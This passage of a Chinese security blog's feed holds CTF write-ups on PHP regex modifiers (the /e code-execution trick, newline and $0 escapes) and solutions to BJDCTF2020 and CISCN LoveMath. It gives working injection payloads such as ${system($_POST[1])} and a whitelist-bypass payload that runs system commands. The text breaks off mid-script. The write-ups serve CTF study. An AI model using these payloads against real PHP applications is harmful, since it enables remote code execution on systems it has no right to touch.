src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520174020072.png" alt loading="lazy"></p><p>虽然传入引号会被转义，但是这并不会影响我们<code>getshell</code>，令第三个参数为<code>&#123;$&#123;system($_POST[1])&#125;&#125;</code>即可<code>POST</code>命令执行参数，这里注意需要匹配到<code>$&#123;&#125;</code>这种类似的符号包裹着代码的才能进行命令执行，是因为<a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a>的原因，<code>$&#123;&#125;</code>中包裹的字符则会当做代码执行</p><h3 id="A-PCRE-ANCHORED"><a href="#A-PCRE-ANCHORED" class="headerlink" title="A (PCRE_ANCHORED)"></a><strong>A (PCRE_ANCHORED)</strong></h3><p>如果设置了这个修饰符，模式被强制为”锚定”模式，也就是说约束匹配使其仅从 目标字符串的开始位置搜索。这个效果同样可以使用适当的模式构造出来(如：<code>^</code>)。简单来讲就是表达式必须是匹配字符串中的开头部分</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520175528269.png" alt loading="lazy"></p><h3 id="U-PCRE-UNGREEDY"><a href="#U-PCRE-UNGREEDY" class="headerlink" title="U(PCRE_UNGREEDY)"></a><strong>U(PCRE_UNGREEDY)</strong></h3><p>这个修饰符逆转了量词的”贪婪”模式。 如果使用这个修饰符，会使量词默认为非贪婪的，通过量词后紧跟<code>?</code>的方式可以使其成为贪婪的。逆转贪婪功能</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php正则表达式模式修饰符/image-20200520182001826.png" style="zoom: 67%;" loading="lazy"><h3 id="X-PCRE-EXTRA"><a href="#X-PCRE-EXTRA" class="headerlink" title="X(PCRE_EXTRA)"></a><strong>X(PCRE_EXTRA)</strong></h3><p>这个修饰符打开了 PCRE 与 perl 不兼容的附件功能。模式中的任意反斜线后就 ingen 一个 没有特殊含义的字符都会导致一个错误，以此保留这些字符以保证向后兼容性。 默认情况下，在 perl 中，反斜线紧跟一个没有特殊含义的字符被认为是该字符的原文。 当前没有其他特性由这个修饰符控制。</p><h3 id="J-PCRE-INFO-JCHANGED"><a href="#J-PCRE-INFO-JCHANGED" class="headerlink" title="J(PCRE_INFO_JCHANGED)"></a><strong>J(PCRE_INFO_JCHANGED)</strong></h3><p>内部选项设置<code>(?J)</code>修改本地的<em>PCRE_DUPNAMES</em>选项。允许子组重名。 (译注：只能通过内部选项设置，外部的 <code>/J</code> 设置会产生错误。)</p><h3 id="u-PCRE-UTF8"><a href="#u-PCRE-UTF8" class="headerlink" title="u(PCRE_UTF8)"></a><strong>u(PCRE_UTF8)</strong></h3><p>此修正符打开一个与 <code>perl</code> 不兼容的附加功能。模式和目标字符串都被认为是<code>utf-8</code>的。 无效的目标字符串会导致 <code>preg_*</code> 函数什么都匹配不到； 无效的模式字符串会导致 <code>E_WARNING</code> 级别的错误。PHP5.3.4 后，5字节和6字节的 UTF-8 字符序列被考虑为无效<code>(resp. PCRE 7.3 2007-08-28)</code>。 以前就被认为是无效的 UTF-8。</p><h3 id="S"><a href="#S" class="headerlink" title="S"></a><strong>S</strong></h3><p>当一个模式需要多次使用的时候，为了得到匹配速度的提升，值得花费一些时间 对其进行一些额外的分析。如果设置了这个修饰符，这个额外的分析就会执行。当前， 这种对一个模式的分析仅仅适用于非锚定模式的匹配(即没有单独的固定开始字符)。</p><h3 id="匹配换行问题"><a href="#匹配换行问题" class="headerlink" title="$匹配换行问题"></a><strong>$匹配换行问题</strong></h3><p>在多行模式下，因为是多行模式，所以<code>$</code>可以匹配每一行的结尾，且不会匹配换行符</p><p>在单行模式下，将整个文本视为一行，所以<code>$</code>匹配的是文本的结尾，且包括结尾的换行符</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520163746726.png" alt loading="lazy"></p><p>例如Apache的换行解析漏洞，因为<code>$</code>能匹配<code>\n</code>，所以上传<code>shell.php\n</code>，仍然可以让Apache解析php文件</p><p>那么该如何解决这种问题呢？</p><p>在php中有一个修饰符<code>D</code>，<code>D</code>是php中独有的修饰符，其作用是告诉引擎<code>$</code>仅匹配文本结尾，不再匹配到一个换行符，在php中可以用<code>D</code>修饰符来解决问题，那么不在php环境下呢？在此之前就需要屡一下正则中具有“首尾”界定符意思的字符：</p><ul><li><code>^</code></li><li><code>$</code></li><li><code>\A</code></li><li><code>\Z</code></li><li><code>\z</code></li></ul><p>第三个<code>\A</code>表示“字符串的开头”，第四个<code>\Z</code>表示行的结尾，其效果其实和<code>$</code>完全一样，第五个<code>\z</code>，表示“字符串的结尾”，所以<code>\A</code>和<code>\z</code>这两个界定符才是真正表示“字符串开头”和“字符串结尾”的，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520170351144.png" alt loading="lazy"></p><h3 id="正则替换"><a href="#正则替换" class="headerlink" title="正则替换"></a><strong>正则替换</strong></h3><p>利用<code>$0</code>来进行正则替换使符号逃逸</p><p>有如下代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$api</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'api'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./option.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\$API = '.*';/s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\$API = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$api</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./option.php'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>我们可以对<code>option.php</code>进行写操作，下面看如何利用<code>$0</code>来绕过这个正则的限制</p><p>传入<code>?api=;phpinfo();</code>，<code>option.php</code>中的内容变成了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$API</span> <span class="token operator">=</span> <span class="token string single-quoted-string">';phpinfo();'</span><span class="token punctuation">;</span></span></code></pre><p>再传入<code>?api=$0</code>，<code>option.php</code>中的内容变成了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$API</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'$API = '</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">;</span></span></code></pre><p>成功使得单引号逃逸，造成代码执行，$0等的使用方法：</p><ul><li><code>$1</code>表示捕获组1，<code>$0</code>表示整个匹配组。</li><li>如果<code>$1</code>后面紧接一个数字，则需要写成<code>\$&#123;1&#125;</code>的形式。</li></ul><p>再来看看<code>preg_replace</code>的具体使用方法</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php正则表达式模式修饰符/image-20200520192912940.png" style="zoom: 80%;" loading="lazy"><h3 id="巨人的肩膀"><a href="#巨人的肩膀" class="headerlink" title="巨人的肩膀"></a><strong>巨人的肩膀</strong></h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">经典写配置漏洞与几种变形</a></li><li><a href="https://www.smi1e.top/%e5%b0%8f%e5%af%86%e5%9c%88%e7%bb%8f%e5%85%b8%e5%86%99%e9%85%8d%e7%bd%ae%e6%bc%8f%e6%b4%9e%e4%b8%8e%e5%87%a0%e7%a7%8d%e5%8f%98%e5%bd%a2%e5%ad%a6%e4%b9%a0/">[小密圈]经典写配置漏洞与几种变形学习</a></li><li><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></li><li><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php">PHP模式修饰符</a></li></ul><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a><em>栗子</em></h3><h4 id="BJDCTF2020-ZJCTF—不过如此"><a href="#BJDCTF2020-ZJCTF—不过如此" class="headerlink" title="BJDCTF2020-ZJCTF—不过如此"></a><strong>BJDCTF2020-ZJCTF—不过如此</strong></h4><p>首先题目先给出了一段代码：</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phperror_reporting(0);$text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;    echo (file_get_contents($text,&#39;r&#39;));    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;        die(&quot;Not now!&quot;);    &#125;    include($file);  &#x2F;&#x2F;next.php    &#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>构造<code>payload</code>读取<code>next.php</code>的内容</p><pre class="language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//e4d6525b-eb85-41c7-9bbb-f48802a4eb3a.node3.buuoj.cn</span><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain;base64,SSBoYXZlIGEgZHJlYW0=</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=next.php</span></code></pre><p>将读到的base64解码得到<code>next.php</code>文件的内容</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>看到了<code>complex</code>方法中的<code>preg_replace</code>函数，里面的正则表达式使用了<code>e</code>修饰符，利用上面的原理构造：</p><p><code>payload</code>：<code>?\S*=$&#123;system($_POST[1])&#125;</code>   POST:<code>1=cat /flag;</code>即可拿到<code>flag</code>，</p><p>也可以利用里面的<code>getFlag</code>方法<code>?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=highlight_file(&#39;/flag&#39;);</code>也可以拿到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php单双引号的区别：&lt;/p&gt;
&lt;p&gt;单引号：php不会读取里面的变量，作为纯字符串处理&lt;/p&gt;
&lt;p&gt;双引号：PHP会尝试读取里面的变量，或者反斜杠表示的特殊符号，例如&lt;code&gt;\n&lt;/code&gt;，&lt;code&gt;\0&lt;/code&gt;等&lt;/p&gt;
&lt;p&gt;处理字符串变量替换的连接速度方面，php7前单引号会快些，而在php7之后就没区别了，&lt;a href=&quot;https://www.laruence.com/2008/08/19/338.html&quot;&gt;详见&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="正则" scheme="https://www.extrader.top/tags/%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>CISCN-LoveMath-php动态函数执行</title>
    <link href="https://www.extrader.top/posts/a649e496/"/>
    <id>https://www.extrader.top/posts/a649e496/</id>
    <published>2020-05-17T09:53:48.000Z</published>
    <updated>2020-07-14T12:52:02.649Z</updated>
    
    <content type="html"><![CDATA[<p>  先看到题目给出的源码：</p><span id="more"></span><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token comment">//例子 c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dechex'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//帮你算出答案</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>代码审计限制条件</p><ul><li>传入的<code>c</code>的字符串长度大小不能大于80</li><li>传入的字符串不能包含<code>&#39; &#39;</code>, <code>&#39;\t&#39;</code>, <code>&#39;\r&#39;</code>, <code>&#39;\n&#39;</code>,<code>&#39;\&#39;&#39;</code>, <code>&#39;&quot;&#39;</code>, <code>&#39;``&#39;</code>, <code>&#39;\[&#39;</code>, <code>&#39;\]&#39;</code></li><li><code>preg_match_all</code>将匹配到的结果传给<code>$used_funcs</code>，<code>$used_funcs</code>只能是<code>$whitelist</code>中的函数，意识就是传入的字符串中的词组也只能是<code>$whitelist</code>中的单词</li></ul><p>以上条件满足后即可传入<code>eval</code>中执行代码</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre><p>分析：</p><ul><li><code>base_convert</code>函数的功能是在任意进制的字符串之间转换数字<code>base_convert(37907361743,10,36)  ==&gt;  hex2bin</code></li><li><code>dechex(1598506324)  ==&gt;  5f474554</code>，<code>hex2bin(&quot;5f474554&quot;)  ==&gt;  _GET</code></li><li>选用<code>pi</code>的原因是因为题目有长度限制，白名单中最短的就是这两个字符<code>pi</code>，故选它</li><li>当<code>$pi</code>=<code>_GET</code>之后再在前面加一个<code>$</code>就形成了<code>$_GET</code></li><li><code>($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)</code>翻译过来就是<code>($_GET)&#123;1&#125;(($_GET)&#123;2&#125;) === $_GET[1]($_GET[2])</code>，传入<code>1=system</code>即可进行命令执行</li></ul><p>举一反三，那么我们改如何构造出这种方法呢？<code>base_convert</code>的进制转换不知道的话又怎么知道该传入什么数字和进制呢？于是写出构造脚本：</p><p><code>base_convert</code>函数构造：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'hex2bin'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'len='</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token string single-quoted-string">'base_convert参数->'</span><span class="token operator">.</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$j</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>这样即可得到所有的进制转换结果，当然如果题目没有引号限制，<code>is_numeric</code>函数也可以去掉，在里面选取所需要的即可</p><p>那么<code>dechex</code>如何构造呢？这个就简单了，两行代码就可以搞定</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"_GET"</span><span class="token punctuation">;</span><span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$num</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 